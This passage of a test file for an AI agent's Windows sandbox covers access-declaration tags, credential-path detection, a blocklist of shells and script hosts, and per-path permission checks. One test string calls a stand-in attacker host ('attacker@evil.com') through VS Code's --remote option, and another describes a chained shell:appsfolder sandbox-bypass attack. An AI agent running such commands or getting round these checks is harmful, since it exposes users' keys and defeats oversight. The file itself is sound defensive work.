      "$ErrorActionPreference = 'Stop' " +
      "$accessA = 'C:\\Users\\AccessA' " +
      "$accessB = 'C:\\Users\\AccessB' " +
      "$desktop = 'C:\\Users\\yuxwei\\Desktop' " +
      "Get-ChildItem -Path $accessA -File -Recurse" +
      "# [declare-access]ro:C:\\Users\\AccessA;ro:C:\\Users\\AccessB;rw:C:\\Users\\yuxwei\\Desktop[/declare-access] " +
      "$ErrorActionPreference = 'Stop'";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    // Both tags stripped
    expect(result).not.toContain("[declare-access]");
    expect(result).not.toContain("[/declare-access]");
    // Command body preserved
    expect(result).toContain("$ErrorActionPreference");
    expect(result).toContain("Get-ChildItem");
    expect(result).toContain("$accessA");
  });

  it("deduplicates three identical tags", () => {
    const cmd =
      "# [declare-access]rw:C:\\a;ro:C:\\b[/declare-access]\n" +
      "Copy-Item C:\\a\\f.txt C:\\b\\\n" +
      "# [declare-access]rw:C:\\a;ro:C:\\b[/declare-access]\n" +
      "# [declare-access]rw:C:\\a;ro:C:\\b[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).not.toContain("[declare-access]");
    expect(result).toContain("Copy-Item");
  });

  // ── Case 3: Same path with different access levels — rw supersedes ro ──

  it("upgrades ro to rw when same path appears with both access levels", () => {
    // First tag declares ro:C:\a, second tag declares rw:C:\a
    // Should deduplicate to rw:C:\a only (rw implies read)
    const cmd =
      "# [declare-access]ro:C:\\a[/declare-access]\n" +
      "Move-Item C:\\a\\f.txt C:\\b\\\n" +
      "# [declare-access]rw:C:\\a[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).not.toContain("[declare-access]");
    expect(result).toContain("Move-Item");
  });

  it("upgrades ro to rw even when rw comes first", () => {
    // rw appears first, ro later — should keep rw, discard ro
    const cmd =
      "# [declare-access]rw:C:\\a[/declare-access]\n" +
      "Move-Item C:\\a\\f.txt C:\\b\\\n" +
      "# [declare-access]ro:C:\\a[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).not.toContain("[declare-access]");
    expect(result).toContain("Move-Item");
  });

  it("real-world: mixed access upgrade with multiple paths", () => {
    // First tag: ro for AccessA/AccessB, rw for Desktop
    // Second tag: rw for AccessA/AccessB, rw for Desktop
    // Should upgrade AccessA/AccessB from ro→rw, Desktop stays rw
    const cmd =
      "# [declare-access]ro:C:\\Users\\AccessA;ro:C:\\Users\\AccessB;rw:C:\\Users\\yuxwei\\Desktop[/declare-access] " +
      "$ErrorActionPreference = 'Stop' " +
      "Move-Item C:\\Users\\AccessA\\f.txt C:\\Users\\yuxwei\\Desktop\\" +
      "# [declare-access]rw:C:\\Users\\AccessA;rw:C:\\Users\\AccessB;rw:C:\\Users\\yuxwei\\Desktop[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).not.toContain("[declare-access]");
    expect(result).toContain("$ErrorActionPreference");
    expect(result).toContain("Move-Item");
  });

  // ── Edge cases ──

  it("strips tags with different comment prefixes", () => {
    const cmd =
      "# [declare-access]rw:C:\\a[/declare-access]\n" +
      "Move-Item C:\\a\\f.txt C:\\b\\\n" +
      "// [declare-access]rw:C:\\a[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(result).not.toBeNull();
    expect(result).not.toContain("[declare-access]");
    expect(result).not.toContain("//");
    expect(result).toContain("Move-Item");
  });
});

// ── Sensitive path detection (sandbox-sensitive.js logic, re-implemented for testing) ──

describe("isSensitivePath", () => {
  const SENSITIVE_DIRS = [".ssh", ".gnupg", ".aws", ".azure", ".config\\gcloud"];
  const home = "C:\\Users\\testuser";

  function isSensitivePath(filePath: string): boolean {
    if (!home || !filePath) return false;
    let resolved: string;
    try {
      resolved = path.resolve(String(filePath)).toLowerCase();
    } catch {
      return false;
    }
    const homeLower = home.toLowerCase();
    for (const d of SENSITIVE_DIRS) {
      const sensitive = path.join(homeLower, d).toLowerCase();
      if (resolved === sensitive || resolved.startsWith(sensitive + path.sep)) return true;
    }
    return false;
  }

  it("detects .ssh directory", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh")).toBe(true);
  });

  it("detects files inside .ssh", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh\\id_rsa")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh\\id_ed25519")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh\\config")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh\\known_hosts")).toBe(true);
  });

  it("detects .gnupg directory and contents", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.gnupg")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.gnupg\\secring.gpg")).toBe(true);
  });

  it("detects .aws credentials", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.aws")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.aws\\credentials")).toBe(true);
  });

  it("detects .azure directory", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.azure")).toBe(true);
  });

  it("detects .config/gcloud", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\.config\\gcloud")).toBe(true);
    expect(isSensitivePath("C:\\Users\\testuser\\.config\\gcloud\\credentials.json")).toBe(true);
  });

  it("does NOT flag normal directories", () => {
    expect(isSensitivePath("C:\\Users\\testuser\\Documents")).toBe(false);
    expect(isSensitivePath("C:\\Users\\testuser\\Desktop\\file.txt")).toBe(false);
    expect(isSensitivePath("C:\\Users\\testuser\\.openclaw")).toBe(false);
  });

  it("does NOT flag similar-but-different paths", () => {
    // .ssh-keys is not .ssh
    expect(isSensitivePath("C:\\Users\\testuser\\.ssh-keys")).toBe(false);
    // Different user
    expect(isSensitivePath("C:\\Users\\otheruser\\.ssh\\id_rsa")).toBe(false);
    // .config without gcloud subdir
    expect(isSensitivePath("C:\\Users\\testuser\\.config\\other")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(isSensitivePath("C:\\Users\\TESTUSER\\.SSH\\id_rsa")).toBe(true);
    expect(isSensitivePath("c:\\users\\testuser\\.aws\\credentials")).toBe(true);
  });
});

// ── parentOfSensitive (sandbox-sensitive.js logic, re-implemented for testing) ──

describe("parentOfSensitive", () => {
  const home = "C:\\Users\\testuser";

  function parentOfSensitive(dirPath: string): boolean {
    if (!home || !dirPath) return false;
    let resolved: string;
    try {
      resolved = path
        .resolve(String(dirPath))
        .toLowerCase()
        .replace(/[\\/]+$/, "");
    } catch {
      return false;
    }
    const homeNorm = home.toLowerCase().replace(/[\\/]+$/, "");
    return resolved === homeNorm || homeNorm.startsWith(resolved + path.sep);
  }

  it("returns true for home directory itself", () => {
    expect(parentOfSensitive("C:\\Users\\testuser")).toBe(true);
    expect(parentOfSensitive("C:\\Users\\testuser\\")).toBe(true);
  });

  it("returns true for ancestors of home (C:\\Users, C:\\)", () => {
    expect(parentOfSensitive("C:\\Users")).toBe(true);
    expect(parentOfSensitive("C:\\")).toBe(true);
  });

  it("returns false for child dirs of home", () => {
    expect(parentOfSensitive("C:\\Users\\testuser\\Documents")).toBe(false);
    expect(parentOfSensitive("C:\\Users\\testuser\\.openclaw")).toBe(false);
    expect(parentOfSensitive("C:\\Users\\testuser\\.ssh")).toBe(false);
  });

  it("returns false for unrelated paths", () => {
    expect(parentOfSensitive("D:\\projects")).toBe(false);
    expect(parentOfSensitive("C:\\MyData")).toBe(false);
  });

  it("returns false for different user's home", () => {
    expect(parentOfSensitive("C:\\Users\\otheruser")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(parentOfSensitive("c:\\users\\TESTUSER")).toBe(true);
    expect(parentOfSensitive("C:\\USERS")).toBe(true);
  });
});

// ── hasSensitivePaths (sandbox-cp-hooks helper, re-implemented for testing) ──

describe("hasSensitivePaths", () => {
  const SENSITIVE_DIRS = [".ssh", ".gnupg", ".aws", ".azure", ".config\\gcloud"];
  const home = "C:\\Users\\testuser";

  function isSensitivePath(filePath: string): boolean {
    if (!home || !filePath) return false;
    let resolved: string;
    try {
      resolved = path.resolve(String(filePath)).toLowerCase();
    } catch {
      return false;
    }
    const homeLower = home.toLowerCase();
    for (const d of SENSITIVE_DIRS) {
      const sensitive = path.join(homeLower, d).toLowerCase();
      if (resolved === sensitive || resolved.startsWith(sensitive + path.sep)) return true;
    }
    return false;
  }

  function hasSensitivePaths(writePaths: string[], readPaths: string[]): string | null {
    for (const p of writePaths) {
      if (isSensitivePath(p)) return p;
    }
    for (const p of readPaths) {
      if (isSensitivePath(p)) return p;
    }
    return null;
  }

  it("returns null for empty arrays", () => {
    expect(hasSensitivePaths([], [])).toBeNull();
  });

  it("returns null for non-sensitive paths", () => {
    expect(
      hasSensitivePaths(
        ["C:\\Users\\testuser\\Documents\\file.txt"],
        ["C:\\Users\\testuser\\Desktop"],
      ),
    ).toBeNull();
  });

  it("detects sensitive write path", () => {
    expect(hasSensitivePaths(["C:\\Users\\testuser\\.ssh\\authorized_keys"], [])).toBe(
      "C:\\Users\\testuser\\.ssh\\authorized_keys",
    );
  });

  it("detects sensitive read path", () => {
    expect(hasSensitivePaths([], ["C:\\Users\\testuser\\.azure\\accessTokens.json"])).toBe(
      "C:\\Users\\testuser\\.azure\\accessTokens.json",
    );
  });

  it("detects sensitive in mixed list", () => {
    const result = hasSensitivePaths(
      ["C:\\Users\\testuser\\Documents\\out.txt"],
      ["C:\\Users\\testuser\\Desktop", "C:\\Users\\testuser\\.gnupg\\secring.gpg"],
    );
    expect(result).toBe("C:\\Users\\testuser\\.gnupg\\secring.gpg");
  });

  it("returns first hit from write paths before read paths", () => {
    const result = hasSensitivePaths(
      ["C:\\Users\\testuser\\.aws\\credentials"],
      ["C:\\Users\\testuser\\.ssh\\id_rsa"],
    );
    expect(result).toBe("C:\\Users\\testuser\\.aws\\credentials");
  });
});

// ── Inline declare-access sensitive blocking (logic re-implementation) ──

describe("inline declare-access sensitive blocking", () => {
  const SENSITIVE_DIRS = [".ssh", ".gnupg", ".aws", ".azure", ".config\\gcloud"];
  const home = "C:\\Users\\testuser";

  function isSensitivePath(filePath: string): boolean {
    if (!filePath) return false;
    let resolved: string;
    try {
      resolved = path.resolve(String(filePath)).toLowerCase();
    } catch {
      return false;
    }
    const homeLower = home.toLowerCase();
    for (const d of SENSITIVE_DIRS) {
      const sensitive = path.join(homeLower, d).toLowerCase();
      if (resolved === sensitive || resolved.startsWith(sensitive + path.sep)) return true;
    }
    return false;
  }

  // Simulates executeDeclarePayload + tryInlineDeclareAccess blocking logic
  function shouldBlockDeclareAccess(deniedDirs: string[]): {
    blocked: boolean;
    sensitivePath?: string;
  } {
    for (const entry of deniedDirs) {
      const dir = entry.replace(/^(?:rw|ro):/i, "");
      if (isSensitivePath(dir)) return { blocked: true, sensitivePath: dir };
    }
    return { blocked: false };
  }

  it("blocks when a denied dir is sensitive (.azure)", () => {
    const result = shouldBlockDeclareAccess(["ro:C:\\Users\\testuser\\.azure"]);
    expect(result.blocked).toBe(true);
    expect(result.sensitivePath).toBe("C:\\Users\\testuser\\.azure");
  });

  it("blocks when a denied dir is sensitive (.ssh)", () => {
    const result = shouldBlockDeclareAccess(["rw:C:\\Users\\testuser\\.ssh"]);
    expect(result.blocked).toBe(true);
    expect(result.sensitivePath).toBe("C:\\Users\\testuser\\.ssh");
  });

  it("does NOT block when denied dir is not sensitive", () => {
    const result = shouldBlockDeclareAccess(["ro:C:\\Users\\testuser\\Documents"]);
    expect(result.blocked).toBe(false);
  });

  it("does NOT block on empty denied list", () => {
    const result = shouldBlockDeclareAccess([]);
    expect(result.blocked).toBe(false);
  });

  it("blocks on first sensitive hit in mixed denied list", () => {
    const result = shouldBlockDeclareAccess([
      "ro:C:\\Users\\testuser\\Documents",
      "ro:C:\\Users\\testuser\\.aws",
    ]);
    expect(result.blocked).toBe(true);
    expect(result.sensitivePath).toBe("C:\\Users\\testuser\\.aws");
  });
});

// ── External apps allowlist blocklist ──
// Reimplements the filtering logic from:
//   - main.ts  sandbox:set-external-apps IPC handler
//   - tool-sandbox.ts  setExternalApps()
//   - sandbox-preload.js  getExternalApps()
// to verify that shell/script-host names are always stripped.

describe("external apps allowlist blocklist", () => {
  const BLOCKED_NAMES = new Set([
    "cmd",
    "powershell",
    "pwsh",
    "bash",
    "sh",
    "wsl",
    "python",
    "python3",
    "node",
    "cscript",
    "wscript",
    "mshta",
  ]);
  const SHELL_NAMES_SET = new Set([
    "cmd",
    "powershell",
    "pwsh",
    "bash",
    "sh",
    "wsl",
    "python",
    "python3",
    "node",
    "cscript",
    "wscript",
    "mshta",
  ]);
  const MAX_EXTERNAL_APPS = 20;

  // Mirrors main.ts IPC handler logic
  function cleanExternalApps(apps: unknown[]): string[] {
    return apps
      .map((a) =>
        String(a)
          .trim()
          .toLowerCase()
          .replace(/\.exe$/i, ""),
      )
      .filter((a) => /^[a-z0-9_-]+$/.test(a) && !BLOCKED_NAMES.has(a))
      .slice(0, MAX_EXTERNAL_APPS);
  }

  // Mirrors tool-sandbox.ts setExternalApps()
  function filterExternalApps(apps: string[]): string[] {
    return apps
      .map((a) =>
        a
          .trim()
          .toLowerCase()
          .replace(/\.exe$/i, ""),
      )
      .filter((a) => !BLOCKED_NAMES.has(a));
  }

  // Mirrors sandbox-preload.js getExternalApps() filtering
  function filterPreloadApps(apps: string[]): string[] {
    return apps
      .map((s) => String(s).trim().toLowerCase())
      .filter((s) => s && !SHELL_NAMES_SET.has(s));
  }

  describe("IPC handler (cleanExternalApps)", () => {
    it("allows legitimate app names", () => {
      expect(cleanExternalApps(["outlook", "chrome", "excel"])).toEqual([
        "outlook",
        "chrome",
        "excel",
      ]);
    });

    it("blocks all shell executables", () => {
      const shells = [
        "cmd",
        "powershell",
        "pwsh",
        "bash",
        "sh",
        "wsl",
        "python",
        "python3",
        "node",
      ];
      expect(cleanExternalApps(shells)).toEqual([]);
    });

    it("blocks Windows script hosts", () => {
      expect(cleanExternalApps(["cscript", "wscript", "mshta"])).toEqual([]);
    });

    it("blocks shells mixed with legitimate apps", () => {
      expect(cleanExternalApps(["outlook", "powershell", "chrome", "cmd", "excel"])).toEqual([
        "outlook",
        "chrome",
        "excel",
      ]);
    });

    it("strips .exe suffix before checking blocklist", () => {
      expect(cleanExternalApps(["powershell.exe", "cmd.exe", "outlook.exe"])).toEqual(["outlook"]);
    });

    it("is case-insensitive", () => {
      expect(cleanExternalApps(["PowerShell", "CMD", "OUTLOOK"])).toEqual(["outlook"]);
    });

    it("rejects paths and special characters", () => {
      expect(cleanExternalApps(["C:\\Windows\\cmd", "../cmd", "cmd;rm", "out look"])).toEqual([]);
    });

    it("enforces max list length", () => {
      const apps = Array.from({ length: 30 }, (_, i) => `app${i}`);
      expect(cleanExternalApps(apps)).toHaveLength(MAX_EXTERNAL_APPS);
    });

    it("handles non-string input gracefully", () => {
      // String(null) → "null", String(undefined) → "undefined" — both pass regex
      // but are harmless (not shell names). Only verify no crash and no blocked names sneak through.
      const result = cleanExternalApps([123, null, undefined, "outlook", "cmd"] as any);
      expect(result).not.toContain("cmd");
      expect(result).toContain("outlook");
    });

    it("rejects empty/whitespace strings", () => {
      expect(cleanExternalApps(["", "  ", "outlook"])).toEqual(["outlook"]);
    });
  });

  describe("ToolSandbox.setExternalApps (filterExternalApps)", () => {
    it("filters shell names from the list", () => {
      expect(filterExternalApps(["outlook", "cmd", "chrome", "powershell"])).toEqual([
        "outlook",
        "chrome",
      ]);
    });

    it("passes through legitimate apps unchanged", () => {
      expect(filterExternalApps(["outlook", "excel", "winword", "code"])).toEqual([
        "outlook",
        "excel",
        "winword",
        "code",
      ]);
    });

    it("filters all script hosts", () => {
      expect(filterExternalApps(["cscript", "wscript", "mshta"])).toEqual([]);
    });
  });

  describe("sandbox-preload.js getExternalApps (filterPreloadApps)", () => {
    it("filters shell names from HMAC-verified list", () => {
      expect(filterPreloadApps(["outlook", "cmd", "node", "chrome"])).toEqual([
        "outlook",
        "chrome",
      ]);
    });

    it("filters all blocked names", () => {
      const allBlocked = [...SHELL_NAMES_SET];
      expect(filterPreloadApps(allBlocked)).toEqual([]);
    });

    it("passes legitimate apps", () => {
      expect(filterPreloadApps(["firefox", "msedge", "excel"])).toEqual([
        "firefox",
        "msedge",
        "excel",
      ]);
    });

    it("filters empty strings", () => {
      expect(filterPreloadApps(["", "outlook", ""])).toEqual(["outlook"]);
    });
  });

  describe("blocklist completeness", () => {
    it("main.ts and tool-sandbox.ts blocklists match", () => {
      // Both should have the same entries
      expect([...BLOCKED_NAMES].sort()).toEqual([...SHELL_NAMES_SET].sort());
    });

    it("all entries in SHELL_NAMES_SET are lowercase alphanumeric", () => {
      for (const name of SHELL_NAMES_SET) {
        expect(name).toMatch(/^[a-z0-9_-]+$/);
      }
    });

    it("default external apps in settings don't overlap with blocklist", () => {
      const defaults = [
        "outlook",
        "excel",
        "winword",
        "powerpnt",
        "chrome",
        "msedge",
        "firefox",
        "code",
      ];
      for (const app of defaults) {
        expect(BLOCKED_NAMES.has(app)).toBe(false);
      }
    });
  });
});

// ── checkApproval: no auto-bypass for whitelisted apps ──
// Reimplements the checkApproval logic from sandbox-cp-hooks.js to verify
// that whitelisted apps no longer auto-bypass without user approval.

describe("checkApproval — no auto-bypass for whitelisted apps", () => {
  // Reimplemented extractLaunchedApp (simplified for testing)
  const SHELL_NAMES = new Set([
    "cmd",
    "powershell",
    "pwsh",
    "bash",
    "sh",
    "wsl",
    "python",
    "python3",
    "node",
    "cscript",
    "wscript",
    "mshta",
  ]);

  function extractLaunchedApp(payload: string): string | null {
    let m: RegExpMatchArray | null, name: string;
    m = payload.match(/(?:explorer|start)\s+.*shell:appsfolder\\([^!\\]+)![^\s"']*/i);
    if (m) return "store:" + m[1].toLowerCase();
    m = payload.match(
      /(?:start-process|invoke-item|ii)\s+["']?(?:[^"']*\\)?([a-z0-9_-]+)(?:\.exe)?["']?/i,
    );
    if (m) {
      name = m[1].toLowerCase();
      if (!SHELL_NAMES.has(name)) return name;
    }
    m = payload.match(/&\s+["'](?:[^"']*\\)?([a-z0-9_-]+)(?:\.exe)?["']/i);
    if (m) {
      name = m[1].toLowerCase();
      if (!SHELL_NAMES.has(name)) return name;
    }
    m = payload.match(/\bstart\s+(?:""\s+)?["']?(?:[^"']*\\)?([a-z0-9_-]+)(?:\.exe)?["']?/i);
    if (m) {
      name = m[1].toLowerCase();
      if (!SHELL_NAMES.has(name)) return name;
    }
    return null;
  }

  // Simplified checkApproval — returns 'needs-approval' instead of blocking.
  // Store apps (store:*) are no longer auto-bypassed: Shell activation runs
  // them outside AppContainer, so they require explicit user approval just
  // like any other non-whitelisted app.
  type Decision = "bypass" | "needs-approval" | "none";
  function checkApproval(payload: string): Decision {
    const appName = extractLaunchedApp(payload);
    if (!appName) return "none";
    return "needs-approval";
  }

  it("whitelisted app 'code' requires approval (not auto-bypass)", () => {
    expect(checkApproval("Start-Process code")).toBe("needs-approval");
  });

  it("whitelisted app 'outlook' requires approval", () => {
    expect(checkApproval("Start-Process outlook")).toBe("needs-approval");
  });

  it("whitelisted app 'excel' requires approval", () => {
    expect(checkApproval("Start-Process excel")).toBe("needs-approval");
  });

  it("code with --remote args requires approval (attack vector)", () => {
    expect(
      checkApproval("Start-Process code --remote ssh-remote+attacker@evil.com /tmp/payload.sh"),
    ).toBe("needs-approval");
  });

  it("Store apps require user approval (Shell activation runs outside AC)", () => {
    expect(
      checkApproval("explorer shell:appsfolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"),
    ).toBe("needs-approval");
  });

  it("chained shell:appsfolder + arbitrary command requires approval (sandbox bypass attack)", () => {
    // Attack: `explorer shell:appsfolder\X_1!A; notepad.exe` would previously
    // auto-bypass as a Store app, executing notepad.exe outside the sandbox.
    expect(checkApproval("explorer shell:appsfolder\\X_1!A; notepad.exe")).toBe("needs-approval");
  });

  it("non-app commands return 'none'", () => {
    expect(checkApproval("Get-ChildItem C:\\Users")).toBe("none");
  });

  it("shell names are NOT detected as app launches", () => {
    expect(checkApproval("Start-Process powershell")).toBe("none");
    expect(checkApproval("Start-Process cmd")).toBe("none");
    expect(checkApproval("Start-Process node")).toBe("none");
  });
});

// ── Per-path independent enforcement ──
// Verifies that declare-access for directory A does NOT cause directories B
// and C to be silently allowed. Each path is checked independently.
//
// This covers the concern: "What if the model declares access to A but the
// command actually touches A, B, and C? Will B and C slip through?"
//
// Answer: No. Path extraction + permission checks are per-path.

const pathExtraction = require("../../appcontainer/path-extraction.js");
const sandboxState = require("../../appcontainer/sandbox-state.js");

describe("per-path independent enforcement", () => {
  describe("path extraction finds all paths regardless of declare-access", () => {
    // declare-access only declares A, but extractWritePaths/extractReadPaths
    // will still find B, C from the actual command text.

    it("Copy-Item: extracts both source (read) and destination (write)", () => {
      const cmd = 'Copy-Item "C:\\DirA\\file.txt" "C:\\DirB\\"';
      const writePaths = pathExtraction.extractWritePaths(cmd);
      const readPaths = pathExtraction.extractReadPaths(cmd);
      // B should appear as write target
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dirb"))).toBe(true);
      // A should appear as read source
      expect(readPaths.some((p: string) => p.toLowerCase().includes("dira"))).toBe(true);
    });

    it("Move-Item: extracts source and destination independently", () => {
      const cmd = 'Move-Item "C:\\Source\\data.txt" "C:\\Dest\\data.txt"';
      const writePaths = pathExtraction.extractWritePaths(cmd);
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dest"))).toBe(true);
    });

    it("multi-statement command: each statement's paths are extracted", () => {
      const cmd =
        'Get-Content "C:\\DirA\\input.txt"; Set-Content -Path "C:\\DirB\\output.txt" -Value "hello"; Remove-Item "C:\\DirC\\old.txt"';
      const writePaths = pathExtraction.extractWritePaths(cmd);
      const readPaths = pathExtraction.extractReadPaths(cmd);
      // DirB (Set-Content target) and DirC (Remove-Item target) are write paths
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dirb"))).toBe(true);
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dirc"))).toBe(true);
      // DirA (Get-Content source) is a read path
      expect(readPaths.some((p: string) => p.toLowerCase().includes("dira"))).toBe(true);
    });

    it("inline declare-access tag is stripped but remaining paths are still extractable", () => {
      // Model declares only DirA, but command also writes to DirB
      const fullCmd =
        '# [declare-access]rw:C:\\DirA[/declare-access]\nCopy-Item "C:\\DirA\\f.txt" "C:\\DirB\\"';
      // tryInlineDeclareAccess strips the tag, remaining command is the Copy-Item
      const { DECLARE_TAG_RE } = cpHooks;
      const m = DECLARE_TAG_RE.exec(fullCmd);
      expect(m).not.toBeNull();
      // After stripping, the remaining command still contains DirB
      const remaining = fullCmd.substring(m!.index + m![0].length).trim();
      const writePaths = pathExtraction.extractWritePaths(remaining);
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dirb"))).toBe(true);
    });
  });

  describe("isBlockedPath checks each path independently against dir lists", () => {
    // Reimplemented: skips safe-path checks for this test (uses raw dir matching only)
    function isBlockedByDirs(filePath: string, rwDirs: string[], roDirs: string[]): boolean {
      const resolved = path.resolve(String(filePath)).toLowerCase();
      let rwMatchLen = 0;
      for (const rw of rwDirs) {
        if (
          (resolved === rw.slice(0, -1) || resolved.indexOf(rw) === 0) &&
          rw.length > rwMatchLen
        ) {
          rwMatchLen = rw.length;
        }
      }
      if (rwMatchLen > 0) return false; // allowed by RW
      let roMatchLen = 0;
      for (const ro of roDirs) {
        if (
          (resolved === ro.slice(0, -1) || resolved.indexOf(ro) === 0) &&
          ro.length > roMatchLen
        ) {
          roMatchLen = ro.length;
        }
      }
      // If in RO dir, blocked for write but not read - for this test, treat as blocked (write)
      return true; // not in any approved dir
    }

    it("granting RW to DirA does NOT grant RW to DirB", () => {
      const rwDirs = ["c:\\dira\\"];
      const roDirs: string[] = [];

      // DirA is not blocked (RW granted)
      expect(isBlockedByDirs("C:\\DirA\\file.txt", rwDirs, roDirs)).toBe(false);
      // DirB IS blocked (no grant)
      expect(isBlockedByDirs("C:\\DirB\\file.txt", rwDirs, roDirs)).toBe(true);
      // DirC IS blocked (no grant)
      expect(isBlockedByDirs("C:\\DirC\\file.txt", rwDirs, roDirs)).toBe(true);
    });

    it("granting RW to parent does NOT grant RW to sibling", () => {
      const rwDirs = ["c:\\users\\admin\\desktop\\"];
      const roDirs: string[] = [];

      expect(isBlockedByDirs("C:\\Users\\admin\\Desktop\\file.txt", rwDirs, roDirs)).toBe(false);
      expect(isBlockedByDirs("C:\\Users\\admin\\Documents\\file.txt", rwDirs, roDirs)).toBe(true);
      expect(isBlockedByDirs("C:\\Users\\admin\\Downloads\\file.txt", rwDirs, roDirs)).toBe(true);
    });
  });

  describe("preBlockShellCommand checks each extracted path independently", () => {
    // This tests the structure: preBlockShellCommand calls shouldBlockWrite for
    // EACH writePath and shouldBlockRead for EACH readPath. We verify this by
    // checking that path extraction produces the individual paths that would
    // each get checked.

    it("command referencing 3 dirs produces 3 separate path checks", () => {
      // Simulate: model declares rw:C:\DirA, but command touches DirA, DirB, DirC
      const payload =
        'Set-Content -Path "C:\\DirA\\out.txt" -Value (Get-Content "C:\\DirB\\in.txt"); Copy-Item "C:\\DirB\\in.txt" "C:\\DirC\\"';
      const writePaths = pathExtraction.extractWritePaths(payload);
      const readPaths = pathExtraction.extractReadPaths(payload);

      // Collect all unique top-level directories referenced
      const allPaths = [...writePaths, ...readPaths];

      // Should have at least DirA, DirB, DirC (or however many the regex finds)
      // The key point: each gets its own shouldBlockWrite/shouldBlockRead call
      expect(allPaths.length).toBeGreaterThanOrEqual(2);
      // Verify DirC (copy destination) is in the write paths
      expect(writePaths.some((p: string) => p.toLowerCase().includes("dirc"))).toBe(true);
    });

    it("Out-File redirect path is extracted independently from source paths", () => {
      const payload = 'Get-Content "C:\\Source\\data.txt" | Out-File "C:\\Target\\result.txt"';
      const writePaths = pathExtraction.extractWritePaths(payload);
      const readPaths = pathExtraction.extractReadPaths(payload);

      expect(writePaths.some((p: string) => p.toLowerCase().includes("target"))).toBe(true);
      expect(readPaths.some((p: string) => p.toLowerCase().includes("source"))).toBe(true);
    });

    it("> redirect path is extracted as write path", () => {
      const payload = 'Get-Content "C:\\Input\\file.txt" > "C:\\Output\\result.txt"';
      const writePaths = pathExtraction.extractWritePaths(payload);
      expect(writePaths.some((p: string) => p.toLowerCase().includes("output"))).toBe(true);
    });
  });

  describe("fs hooks enforce per-operation (no batch grant)", () => {
    // Each fs monkey-patch calls shouldBlockWrite(specificPath) independently.
    // This test verifies the underlying path check is per-call.

    it("isBlockedPath is stateless — each call evaluates independently", () => {
      // Use the actual sandboxState.isBlockedPath with controlled state
      const originalActive = sandboxState.state.sandboxActive;
      const originalRW = sandboxState.state._rwDirs.slice();
      const originalRO = sandboxState.state._roDirs.slice();

      try {
        sandboxState.state.sandboxActive = true;
        sandboxState.state._rwDirs = sandboxState.normDirList("C:\\Approved");
        sandboxState.state._roDirs = [];

        // Path in approved dir → not blocked
        expect(sandboxState.isBlockedPath("C:\\Approved\\file.txt")).toBe(false);
        // Path NOT in approved dir → blocked (would trigger permission dialog)
        expect(sandboxState.isBlockedPath("C:\\NotApproved\\file.txt")).toBe(true);
        // Another unapproved path → also blocked (no carry-over from previous call)
        expect(sandboxState.isBlockedPath("C:\\AlsoNotApproved\\secret.txt")).toBe(true);
        // Subdirectory of approved → not blocked
        expect(sandboxState.isBlockedPath("C:\\Approved\\sub\\deep\\file.txt")).toBe(false);
        // Sibling of approved → blocked
        expect(sandboxState.isBlockedPath("C:\\Approved2\\file.txt")).toBe(true);
      } finally {
        // Restore state
        sandboxState.state.sandboxActive = originalActive;
        sandboxState.state._rwDirs = originalRW;
        sandboxState.state._roDirs = originalRO;
      }
    });

    it("isReadBlockedPath is also per-call with no cross-contamination", () => {
      const originalActive = sandboxState.state.sandboxActive;
      const originalRW = sandboxState.state._rwDirs.slice();
      const originalRO = sandboxState.state._roDirs.slice();

      try {
        sandboxState.state.sandboxActive = true;
        sandboxState.state._rwDirs = [];
        sandboxState.state._roDirs = sandboxState.normDirList("C:\\ReadOnly");

        // Path in RO dir → not blocked for read
        expect(sandboxState.isReadBlockedPath("C:\\ReadOnly\\file.txt", false)).toBe(false);
        // Path not in any dir → blocked for read
        expect(sandboxState.isReadBlockedPath("C:\\Other\\file.txt", false)).toBe(true);
        // Check again: first path still not blocked, second still blocked
        expect(sandboxState.isReadBlockedPath("C:\\ReadOnly\\another.txt", false)).toBe(false);
        expect(sandboxState.isReadBlockedPath("C:\\Other\\another.txt", false)).toBe(true);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
        sandboxState.state._rwDirs = originalRW;
        sandboxState.state._roDirs = originalRO;
      }
    });

    it("normalizes Node ESM file URLs before checking read access", () => {
      const originalActive = sandboxState.state.sandboxActive;
      const originalRW = sandboxState.state._rwDirs.slice();
      const originalRO = sandboxState.state._roDirs.slice();

      try {
        sandboxState.state.sandboxActive = true;
        sandboxState.state._rwDirs = [];
        sandboxState.state._roDirs = sandboxState.normDirList(
          "C:\\Users\\testuser\\AppData\\Roaming\\npm\\node_modules\\openclaw",
        );

        const allowed = new URL(
          "file:///C:/Users/testuser/AppData/Roaming/npm/node_modules/openclaw/openclaw.mjs",
        );
        expect(sandboxState.isReadBlockedPath(allowed, false)).toBe(false);
        expect(sandboxState.isReadBlockedPath(allowed.href, false)).toBe(false);
        expect(
          sandboxState.isReadBlockedPath(
            new URL("file:///C:/Users/testuser/AppData/Roaming/npm/node_modules/other/index.mjs"),
            false,
          ),
        ).toBe(true);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
        sandboxState.state._rwDirs = originalRW;
        sandboxState.state._roDirs = originalRO;
